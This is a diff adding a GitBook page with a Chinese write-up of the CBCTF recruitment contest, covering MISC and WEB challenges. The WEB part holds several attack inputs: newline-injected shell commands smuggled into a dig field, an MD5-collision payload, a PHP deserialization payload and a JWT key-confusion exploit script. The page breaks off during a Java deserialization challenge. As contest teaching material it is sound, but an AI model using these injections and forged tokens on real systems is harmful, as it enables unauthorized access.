@@ -1,0 +1,583 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>CBCTF-0RAYS协会招新 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="JS 的一些特性：原型链，作用域，闭包.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            <br />
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    About This Site
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="Racing and Smashing the state machine.html">
+            
+                <a href="Racing and Smashing the state machine.html#20230817">
+            
+                    
+                    Racing and Smashing the state machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="Gandalf AI challenge.html">
+            
+                <a href="Gandalf AI challenge.html#20230707">
+            
+                    
+                    Gandalf AI challenge
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="NSSCTF challenges.html">
+            
+                <a href="NSSCTF challenges.html#20230605">
+            
+                    
+                    NSSCTF challenges
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="JS 的一些特性：原型链，作用域，闭包.html">
+            
+                <a href="JS 的一些特性：原型链，作用域，闭包.html#20230117">
+            
+                    
+                    JS 的一些特性：原型链，作用域，闭包
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="CBCTF-0RAYS协会招新.html">
+            
+                <a href="CBCTF-0RAYS协会招新.html#20221212">
+            
+                    
+                    CBCTF-0RAYS协会招新
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >CBCTF-0RAYS协会招新</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="misc">MISC</h1>
+<h2 id="&#x7B7E;&#x5230;">&#x7B7E;&#x5230;</h2>
+<p>&#x62D6;&#x5165; 010editer &#x53D1;&#x73B0; CRC &#x6821;&#x9A8C;&#x9519;&#x8BEF;&#xFF0C;&#x5C1D;&#x8BD5;&#x4FEE;&#x6539;&#x9AD8;&#x5EA6;</p>
+<p>&#x5F97;&#x5230;&#x5B8C;&#x6574;&#x56FE;&#x7247;&#x901A;&#x8FC7; stegsolve &#x5728;&#x5176;&#x4ED6;&#x989C;&#x8272;&#x901A;&#x9053;&#x53D1;&#x73B0;&#x4E86; flag &#x3002;</p>
+<blockquote>
+<p>CBCTF{th4t_iS_why_Namless_is_a_Pwner}</p>
+</blockquote>
+<h2 id="&#x53C8;&#x4E00;&#x4E2A;&#x7B7E;&#x5230;">&#x53C8;&#x4E00;&#x4E2A;&#x7B7E;&#x5230;</h2>
+<p>&#x5E38;&#x89C4;&#x660E;&#x6587;&#xFF0C;&#x538B;&#x7F29;&#x8F6F;&#x4EF6;&#x4E3A; winrar</p>
+<p>&#x5F97;&#x5230;&#x538B;&#x7F29;&#x5305;&#x63A9;&#x7801;&#x653B;&#x51FB;&#xFF0C;&#x53D1;&#x73B0;&#x65F6;&#x95F4;&#x6709;&#x70B9;&#x957F;</p>
+<p>&#x9042;&#x731C;&#x6D4B;&#x63A9;&#x7801;&#x90E8;&#x5206;&#x4E3A; 0RAYS &#x89E3;&#x538B;&#x5F97;&#x5230; flag</p>
+<blockquote>
+<p>CBCTF{0ays_My_fav0rit3}</p>
+</blockquote>
+<h2 id="&#x7B7E;&#x4E8C;&#x9001;&#x4E00;">&#x7B7E;&#x4E8C;&#x9001;&#x4E00;</h2>
+<p>&#x5176;&#x5B9E;&#x5728;&#x5199;&#x524D;&#x4E24;&#x9898;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x53D1;&#x73B0;&#x4E86; flag &#x7684;&#x683C;&#x5F0F;&#x6709;&#x70B9;&#x95EE;&#x9898;</p>
+<p>&#x5728;&#x7F51;&#x9875;&#x6E90;&#x7801;&#x4E2D;&#x627E;&#x5230;&#x4E86; /myS3cretPa9e</p>
+<p>&#x6253;&#x5F00;&#x53D1;&#x73B0; emoji-AES &#x52A0;&#x5BC6;&#x7B26;&#x53F7;&#xFF0C;</p>
+<p>&#x5BC6;&#x7801;&#x4E3A;&#x524D;&#x4E24;&#x9898;&#x7F3A;&#x7684;&#x5B57;&#x7B26; re &#xFF0C;&#x5F97;&#x5230; flag</p>
+<blockquote>
+<p>CBCTF{wow~y0u_F1nd_th3_seCret}</p>
+</blockquote>
+<h2 id="&#x667A;&#x80FD;&#x5361;">&#x667A;&#x80FD;&#x5361;</h2>
+<p>&#x4E0D;&#x719F;&#x6089; dump &#x6587;&#x4EF6;&#xFF0C;&#x628A; Volatility &#x548C; TestDisk &#x68AD;&#x4E86;&#x4E00;&#x904D;&#x53D1;&#x73B0;&#x5565;&#x90FD;&#x6CA1;&#x6709;</p>
+<p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x2018;&#x667A;&#x80FD;&#x5361;&#x2019;&#x4E86;&#x89E3;&#x5230;&#x5E94;&#x8BE5;&#x4E3A; M1 &#x5361;&#x7684;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF; dump &#x51FA;&#x6765;&#x7684;</p>
+<p>&#x7528; MifareOneTool &#x63D0;&#x53D6;&#x4E86;&#x6709;&#x6548;&#x4F4D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#xFF08;&#x624B;&#x6413;&#x4E5F;&#x5F88;&#x5FEB;</p>
+<p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x540E;&#x6765;&#x653E;&#x51FA;&#x7684; hint &#x4ECE; Xor &#x65B9;&#x9762;&#x5165;&#x624B;&#xFF0C;&#x4F46;&#x627E;&#x4E0D;&#x5230; key</p>
+<p>&#x540E;&#x6765;&#x53D1;&#x73B0; key &#x957F;&#x5EA6;&#x975E;&#x5355;&#x5B57;&#x8282;&#xFF0C;&#x9042;&#x5199;&#x811A;&#x672C;&#x89E3;&#x5BC6;</p>
+<pre><code class="lang-python">a=[<span class="hljs-number">0xF8</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0xA1</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xFD</span>,<span class="hljs-number">0x3B</span>,<span class="hljs-number">0xBB</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0xCE</span>,<span class="hljs-number">0x1F</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0xFB</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0xD5</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xc6</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x8a</span>]
+key = [<span class="hljs-number">0xbb</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xe2</span>,<span class="hljs-number">0x21</span>]
+t = <span class="hljs-number">0</span>
+flag =<span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)):
+    flag= flag + chr(a[i] ^ key[t])
+    t = (t + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>
+print(flag)
+</code></pre>
+<blockquote>
+<p>CBCTF{wow~y0u_F1nd_th3_seCret}</p>
+</blockquote>
+<h2 id="&#x73AF;">&#x73AF;*</h2>
+<p>&#x5C06;&#x9644;&#x4EF6;&#x538B;&#x7F29;&#x5305;&#x89E3;&#x538B;&#x53D1;&#x73B0;&#x4E3A;&#x591A;&#x6B21;&#x7684;&#x4F2A;&#x52A0;&#x5BC6;&#x91CD;&#x590D;&#x64CD;&#x4F5C;</p>
+<p>&#x5199;&#x811A;&#x672C;&#x89E3;&#x538B;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> zipfile,os,pyzipper
+path = <span class="hljs-string">r&apos;C:\Users\xxxxx\Desktop\2&apos;</span>
+<span class="hljs-keyword">with</span> open(fakecry,<span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> f:
+        realpos = (f.read()[<span class="hljs-number">-68</span>:<span class="hljs-number">-64</span>])
+print(realpos)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">x</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(path):
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;.zip&apos;</span> <span class="hljs-keyword">in</span> i:
+            route = os.path.join(path,i)
+            zip_file = zipfile.ZipFile(route)
+            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> zip_file.namelist():  
+                zip_file.extract(f, path)
+            zip_file.close()
+            os.remove(route)
+            <span class="hljs-keyword">return</span>(zip_file.namelist())  
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+    fakecry = x()
+    print(fakecry,end=<span class="hljs-string">&quot;&quot;</span>)
+    <span class="hljs-keyword">with</span> open(fakecry[<span class="hljs-number">0</span>],<span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> f:
+        data = f.read()
+        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;0&apos;</span>+fakecry[<span class="hljs-number">0</span>],<span class="hljs-string">&apos;xb&apos;</span>) <span class="hljs-keyword">as</span> f1:
+            f1.write(data[<span class="hljs-number">0</span>:<span class="hljs-number">-68</span>])
+            f1.write(realpos)
+            <span class="hljs-comment">#print(data[-64:-1])</span>
+            f1.write(data[<span class="hljs-number">-64</span>:<span class="hljs-number">-1</span>])
+            f1.write(data[<span class="hljs-number">-2</span>:<span class="hljs-number">-1</span>])
+    os.remove(fakecry[<span class="hljs-number">0</span>])
+    zips=[m <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> os.listdir(path) <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;.zip&apos;</span><span class="hljs-keyword">in</span> m]
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> zips:
+        <span class="hljs-keyword">break</span>
+</code></pre>
+<p>&#x5C06;&#x6253;&#x5370;&#x51FA;&#x6765;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6570;&#x636E;&#x5904;&#x7406;</p>
+<p>&#x7136;&#x540E; cyberchef &#x4E00;&#x628A;&#x68AD;(b32+hex+b32+b64+hex+b32+b64+hex)</p>
+<p>&#x5F97;&#x5230;&#x5BC6;&#x6587;1<code>our secret is P@ssW0rdddd</code></p>
+<p>&#x7136;&#x540E; Oursecret &#x5BF9; flag.jpg &#x89E3;&#x5BC6;&#x5F97;&#x5230;&#x5BC6;&#x6587;2<code>+u(3+??*/RgXs1G(Fn0fUaFAi2@rAN)GVAn&gt;L10fEW$</code></p>
+<p>&#x4F5C;&#x4E3A;&#x5BC6;&#x7801;&#x89E3;&#x5F00;&#x9898;&#x76EE;&#x53E6;&#x4E00;&#x4E2A;&#x9644;&#x4EF6;trueflag.zip&#x5F97;&#x5230;flag</p>
+<blockquote>
+<p>CBCTF{ca6f2d0f-425b-4e47-84cd-9164ea86fd53}</p>
+</blockquote>
+<p><em>&#x6240;&#x4EE5;&#x6CA1;&#x5199;&#x51FA;&#x6765;&#x7684;&#x7ADF;&#x7136;&#x662F;&#x811A;&#x672C;&#x6253;&#x5370;&#x7684;&#x65F6;&#x5019;&#x5C11;&#x4E86;&#x7B2C;&#x4E00;&#x4E2A;&#x538B;&#x7F29;&#x5305;&#x7684;&#x540D;&#x5B57;&#x3002;&#x3002;</em></p>
+<hr>
+<h1 id="web">WEB</h1>
+<h2 id="phpstart">php_start</h2>
+<p>&#x7B80;&#x5355;&#x7684;&#x6539;&#x5305;&#x8FC7;&#xFF08; referer &#x534A;&#x5929;&#x60F3;&#x4E0D;&#x5230;</p>
+<p>&#x7136;&#x540E;&#x5F3A;&#x78B0;&#x649E;</p>
+<pre><code>cbc3=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;cbc4=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+</code></pre><p>&#x547D;&#x4EE4;&#x6267;&#x884C; <code>cat /flag</code>&#xFF08;&#x6570;&#x7EC4;&#x4E5F;&#x884C;</p>
+<blockquote>
+<p>cbctf{655bda55bf98257ae904938677bc48ba}</p>
+</blockquote>
+<h2 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6765;&#x9001;&#x5206;&#x54AF;">&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6765;&#x9001;&#x5206;&#x54AF;</h2>
+<p>&#x7B80;&#x5355;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>{ 
+    <span class="hljs-keyword">public</span> $a;
+}
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>{
+    <span class="hljs-keyword">public</span> $b;
+}
+$aaa = <span class="hljs-keyword">New</span> A();
+$bb1 = <span class="hljs-keyword">New</span> B();
+$bb2 = <span class="hljs-keyword">New</span> B();
+$aaa -&gt; a =$bb1;
+$bb1 -&gt; b = $bb2;
+$bb2 -&gt; b = <span class="hljs-string">&apos;flag.php&apos;</span>;
+<span class="hljs-keyword">echo</span> urlencode(serialize($aaa));
+</code></pre>
+<blockquote>
+<p>cbctf{97c8b1fafd57c6a9dad58e0f33d245b7}</p>
+</blockquote>
+<h5 id="dig">dig*</h5>
+<p>&#x540E;&#x53F0;&#x547D;&#x4EE4;&#x6267;&#x884C; dig \<type> \<domain>&#xFF0C;ban&#x6389;&#x4E86;; $ &amp; | / * \</domain></type></p>
+<p>&#x5F53;&#x65F6;&#x6CA1;&#x770B;&#x4ED4;&#x7EC6;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x7136;&#x540E;&#x5BF9;&#x7740;type&#x4E00;&#x987F;&#x7ED5;&#x8FC7;&#x1F33F;</p>
+<p>&#x6B63;&#x786E;&#x89E3;&#x6CD5;&#x5E94;&#x8BE5;&#x4E3A;</p>
+<pre><code class="lang-shell">{&quot;domain&quot;:&quot;baidu.com&quot;,&quot;type&quot;:&quot;\npwd\n#&quot;} #&#x67E5;&#x770B;&#x5F53;&#x524D;&#x4F4D;&#x7F6E;&#x8DEF;&#x52B2;
+{&quot;domain&quot;:&quot;baidu.com&quot;,&quot;type&quot;:&quot;\ncd ..\ncd ..\ncd ..\nls\n#&quot;} #&#x67E5;&#x770B;&#x6839;&#x76EE;&#x5F55;&#xFF0C;/&#x88AB;ban&#x7528;\n&#x4EE3;&#x66FF;
+{&quot;domain&quot;:&quot;baidu.com&quot;,&quot;type&quot;:&quot;\ncd ..\ncd ..\ncd ..\ncat ffFFLl11AaAag9g99gGg\n#&quot;} #&#x67E5;&#x770B;flag
+</code></pre>
+<blockquote>
+<p>CBCTF{g3eAt_u5e_node_characteristic_c0mmand_1Nj3ct_1T}</p>
+</blockquote>
+<h2 id="ezjwt">ezJWT*</h2>
+<p>&#x77E5;&#x8BC6;&#x70B9;<a href="https://pankas.top/2022/11/14/&#x7814;&#x7A76;&#x751F;&#x8D5B;day2-web/#CVE-2016-5431-Key-Confusion-Attack" target="_blank">pankas&apos;blog#CVE-2016-5431 - Key Confusion Attack</a></p>
+<p>&#x9898;&#x76EE;&#x7ED9;&#x4E86; jwt &#x7B97;&#x6CD5;&#x516C;&#x94A5;</p>
+<p>&#x6E90;&#x7801;&#x5199;&#x5728;&#x6CE8;&#x91CA;&#x91CC;</p>
+<pre><code class="lang-js"><span class="hljs-keyword">var</span> { expressjwt } = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-jwt&quot;</span>);
+<span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;path&apos;</span>);
+<span class="hljs-keyword">var</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;jsonwebtoken&quot;</span>);
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;express&apos;</span>);
+<span class="hljs-keyword">var</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;cookie-parser&apos;</span>);
+<span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);
+<span class="hljs-keyword">const</span> app = express();
+<span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: <span class="hljs-literal">false</span> }));
+app.use(cookieParser());
+<span class="hljs-keyword">var</span> publicKey = fs.readFileSync(<span class="hljs-string">&apos;./config/public.pem&apos;</span>);
+<span class="hljs-keyword">var</span> privateKey = fs.readFileSync(<span class="hljs-string">&apos;./config/private.pem&apos;</span>);
+<span class="hljs-keyword">var</span> flag = fs.readFileSync(<span class="hljs-string">&quot;./flag&quot;</span>);
+app.use(expressjwt({ secret: publicKey, algorithms: [<span class="hljs-string">&quot;HS256&quot;</span>, <span class="hljs-string">&quot;RS256&quot;</span>]}).unless({ path: [<span class="hljs-string">&quot;/&quot;</span>] }));
+app.set(<span class="hljs-string">&apos;views&apos;</span>, path.join(__dirname, <span class="hljs-string">&apos;views&apos;</span>));
+app.set(<span class="hljs-string">&apos;view engine&apos;</span>, <span class="hljs-string">&apos;twig&apos;</span>);
+
+app.get(<span class="hljs-string">&apos;/&apos;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
+    <span class="hljs-keyword">const</span> token = jwt.sign({ username: <span class="hljs-string">&apos;user&apos;</span>, isCTFer: <span class="hljs-literal">false</span>}, privateKey, { algorithm: <span class="hljs-string">&quot;RS256&quot;</span> });
+    res.render(<span class="hljs-string">&apos;index&apos;</span>, { title: <span class="hljs-string">&quot;&#x6B22;&#x8FCE;&#x6765;&#x5230;&#x8D5B;&#x535A;&#x7A7A;&#x95F4;&quot;</span> ,tip:<span class="hljs-string">&quot;&#x8FD9;&#x662F;&#x4F60;&#x7684;&#x8EAB;&#x4EFD;&#x4EE4;&#x724C;:&quot;</span>,token: token });
+})
+
+app.post(<span class="hljs-string">&apos;/flag&apos;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
+    <span class="hljs-keyword">if</span>(req.auth.isCTFer === <span class="hljs-literal">true</span>){
+        res.send(flag);
+    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.auth.isCTFer === <span class="hljs-literal">false</span>) {
+        res.send(<span class="hljs-string">&quot;CBCTF{Su13m1t_it_f4stly_aNd_y0u_will_f1nd_that_you_Hav3_bEen_cHeated}&quot;</span>);
+    }
+
+})
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>{
+    next(createError(<span class="hljs-number">404</span>));
+  });
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>{
+
+  res.locals.message = err.message;
+  res.locals.error = req.app.get(<span class="hljs-string">&apos;env&apos;</span>) === <span class="hljs-string">&apos;development&apos;</span> ? err : {};
+  res.render(<span class="hljs-string">&apos;hint&apos;</span>,{message: <span class="hljs-string">&quot;&#x60F3;&#x62FF;&#x5230;flag&#x5C31;&#x5FC5;&#x987B;&#x5148;&#x8BC1;&#x660E;&#x81EA;&#x5DF1;&#x7684;&#x5B9E;&#x529B;&quot;</span>,hint:<span class="hljs-string">&quot;there are something useful:&quot;</span>,publickey:publicKey});
+});
+
+
+app.listen(port, () =&gt;{
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Node app listening on port <span class="hljs-subst">${port}</span>`</span>);
+})
+</code></pre>
+<p>&#x670D;&#x52A1;&#x7AEF;&#x5BF9; jwt &#x9A8C;&#x8BC1;&#x65F6;&#x5B9A;&#x4E49;&#x4E86; RS256 &#x548C; HS256 &#x4E24;&#x79CD;&#x7B97;&#x6CD5;&#xFF0C;&#x800C; HS256 &#x4E3A;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#xFF0C;&#x53EF;&#x4FEE;&#x6539;&#x52A0;&#x5BC6;&#x65B9;&#x5F0F; alg &#x4E3A; HS256 &#x8FDB;&#x884C; jwt &#x4F2A;&#x9020;</p>
+<p>&#x4FEE;&#x6539; Pyjwt &#x6E90;&#x4EE3;&#x7801;&#x5E93; algorithms.py &#xFF0C;&#x6CE8;&#x91CA;&#x6389;188-192&#x884C;&#x5185;&#x5BB9;&#xFF0C;&#x56E0;&#x4E3A;&#x6B64;&#x5904;&#x4F1A;&#x9A8C;&#x8BC1;&#x5BC6;&#x94A5;&#x683C;&#x5F0F;&#x629B;&#x51FA;&#x9519;&#x8BEF;</p>
+<p>exp:</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> jwt
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> math
+<span class="hljs-keyword">import</span> requests
+
+public = open(<span class="hljs-string">&apos;public.pem&apos;</span>, <span class="hljs-string">&apos;r&apos;</span>).read()
+header = {
+  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,
+  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span>
+}
+payload = {
+    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,
+    <span class="hljs-string">&quot;isCTFer&quot;</span>: <span class="hljs-keyword">True</span>,
+    <span class="hljs-string">&quot;iat&quot;</span>: math.floor(time.time())
+}
+encoded = jwt.encode(payload, public, algorithm=<span class="hljs-string">&apos;HS256&apos;</span>, headers=header)
+data = {<span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Bearer &quot;</span> + encoded}
+url = <span class="hljs-string">&apos;http://b004e4a4-859f-4608-a11b-59bbcd1f2616.training.0rays.club:8001/flag&apos;</span>
+a = requests.post(url,headers = data)
+print(a.text)
+</code></pre>
+<blockquote>
+<p>CBCTF{Ok_y0u_ar3_a_CTFer_Now}</p>
+</blockquote>
+<h2 id="firstjava">first_java*</h2>
+<blockquote>
+<p>&#x770B;&#x4E0D;&#x592A;&#x61C2;&#x5148;&#x8D34;&#x5B98;&#x65B9;wp&#xFF0C;&#x4EE5;&#x540E;&#x518D;&#x8865;</p>
+</blockquote>
+<p>&#x9996;&#x5148;&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x4E86;app.jar&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;Java&#x53CD;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;jd-gui&#x6765;&#x5F97;&#x5230;&#x6E90;&#x7801;&#x3002;&#xFF08;&#x628A;jar&#x5305;&#x62D6;&#x5230;jd-gui.exe&#x5C31;&#x53EF;&#x4EE5;&#x5566;&#xFF09;</p>
+<p>&#x8FA8;&#x8BC6;&#x51FA;&#x6765;&#x662F;springboot&#x9879;&#x76EE;&#xFF08;&#x4E00;&#x4E2A;&#x8F7B;&#x578B;&#x5E94;&#x7528;&#x6846;&#x67B6;&#xFF09;</p>
+<p>&#x770B;&#x770B;controller&#x5C42;</p>
+<pre><code class="lang-java"><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/&quot;</span>)
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">home</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello Java!&quot;</span>;
+}
+<span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/vul&quot;</span>)<span class="hljs-comment">//&#x914D;&#x7F6E;&#x8DEF;&#x7531; &#x8BBF;&#x95EE;ip/vul&#x5373;&#x8FDB;&#x5165;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">read</span><span class="hljs-params">(@RequestParam(name = <span class="hljs-string">&quot;data&quot;</span>, required = <span class="hljs-keyword">true</span>)</span> String data) <span class="hljs-keyword">throws</span> Exception </span>{
+
+    data=data.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;+&quot;</span>);
+    <span class="hljs-comment">//System.out.println(data);</span>
+    <span class="hljs-keyword">byte</span>[] bytes = tools.base64Decode(data);
+    InputStream inputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);
+    ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);
+    objectInputStream.readObject();
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;oHHH~ this is a secret &quot;</span>;
+    }
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x662F;&#x4E00;&#x4E2A;Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5165;&#x53E3;&#xFF0C;&#x5C06;&#x8F93;&#x5165;&#x7684;data&#x8FDB;&#x884C;base64&#x89E3;&#x7801;&#x540E;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;
+&#x7136;&#x540E;&#x627E;&#x8C03;&#x7528;&#x94FE;</p>
+<pre><code class="lang-java"><span class="hljs-meta">@Repository</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
+    <span class="hljs-keyword">private</span> String name;
+    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">User</span><span class="hljs-params">()</span></span>{};
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">new</span> exec(<span class="hljs-keyword">this</span>.name).runcmd();
+        } <span class="hljs-keyword">catch</span> (Exception e) {
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);
+        }
+    }
+    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>{
+        <span class="hljs-keyword">this</span>.eval();
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;
+    }
+}
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exec</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
+    <span class="hljs-keyword">private</span> String cmd;
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">exec</span><span class="hljs-params">(String s)</span></span>{<span class="hljs-keyword">this</span>.cmd=s;};
+    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">runcmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>{
+        Runtime runtime = Runtime.getRuntime();
+        runtime.exec(<span class="hljs-keyword">this</span>.cmd);
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;
+    }
+}
+</code></pre>
